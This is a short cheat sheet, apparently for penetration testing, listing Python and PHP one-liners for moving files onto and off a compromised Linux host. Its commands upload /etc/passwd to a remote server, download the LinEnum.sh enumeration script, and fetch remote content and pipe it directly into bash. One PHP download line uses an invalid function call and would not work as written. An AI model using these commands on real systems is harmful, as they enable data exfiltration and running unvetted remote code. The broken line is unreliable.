---------------
# PYTHON
--------------
- Python3 -Download
```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve($URL, $FILE)'
```
- Python3 - Upload
```bash
# Start the server
python3 -m uploadserver
# Upload the file
python3 -c 'import requests;requests.post($URL/upload, files={"files":open("/etc/passwd","rb")})'

```

-------------------------
# PHP
---------------------
```bash
php -r '$file = file_get_contents($URL); file_output_contents=("linEnum.sh",$file)'
```
- Download with Fopen()
```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen($URL, "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
- PHP Download a File and Pipe it to Bash
```bash
php -r '$lines = @file($URL); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```